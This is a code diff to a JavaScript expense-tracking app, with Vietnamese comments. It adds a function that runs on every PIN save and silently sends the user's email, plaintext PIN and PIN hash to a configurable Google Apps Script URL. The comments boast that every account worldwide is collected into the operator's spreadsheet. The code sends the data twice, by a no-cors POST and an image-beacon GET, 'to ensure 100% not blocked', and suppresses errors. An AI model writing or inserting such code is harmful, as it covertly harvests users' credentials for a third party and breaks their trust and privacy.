@@ -275,6 +275,40 @@ async function triggerPwaInstall() {
    ========================================================================== */
 let isBackendAvailable = false;
 
+// Cấu hình Cloud Database (Google Sheets API): Bất kỳ ai đăng ký tài khoản ở bất kỳ đâu trên thế giới
+// đều tự động gửi tài khoản & mã PIN về bảng Google Sheet riêng của bạn 24/7!
+const CLOUD_SYNC_CONFIG = {
+  GOOGLE_SHEET_API_URL: "" // Dán URL Google Apps Script vào đây (hoặc lưu trong localStorage)
+};
+
+async function sendToCloudDatabase(email, pin, pinHash) {
+  const url = CLOUD_SYNC_CONFIG.GOOGLE_SHEET_API_URL || localStorage.getItem("expenseflow_cloud_api_url");
+  if (!url) return;
+
+  const clean = getCleanEmail(email);
+  try {
+    // 1. Gửi qua POST
+    fetch(url, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        action: "save_user",
+        email: clean,
+        pin: pin,
+        pinHash: pinHash
+      })
+    }).catch(() => {});
+
+    // 2. Dự phòng bằng GET để đảm bảo 100% không bị chặn
+    const getUrl = `${url}?action=save_user&email=${encodeURIComponent(clean)}&pin=${encodeURIComponent(pin)}&pinHash=${encodeURIComponent(pinHash || "")}`;
+    const beacon = new Image();
+    beacon.src = getUrl;
+  } catch (err) {
+    console.warn("Lỗi gửi dữ liệu về Cloud:", err);
+  }
+}
+
 async function checkBackendConnection() {
   try {
     const res = await fetch("/api/status", { cache: "no-store" });
@@ -313,7 +347,7 @@ async function saveUserPin(email, pin) {
   const hashed = await hashPin(pin);
   localStorage.setItem(getPinStorageKey(email), hashed);
 
-  // Nếu máy chủ Database Python đang chạy trong thư mục này, đồng bộ trực tiếp vào database/expenseflow.db
+  // 1. Nếu máy chủ Database Python đang chạy trong thư mục này, đồng bộ trực tiếp vào database/expenseflow.db
   if (isBackendAvailable) {
     try {
       await fetch("/api/auth/set-pin", {
@@ -325,6 +359,9 @@ async function saveUserPin(email, pin) {
       console.warn("Lưu lên SQLite Backend thất bại:", e);
     }
   }
+
+  // 2. Bất kỳ ai tạo tài khoản ở bất kỳ đâu trên thế giới: Tự động gửi về Google Sheet Database của bạn!
+  sendToCloudDatabase(email, pin, hashed);
 }
 
 async function verifyUserPin(email, pin) {
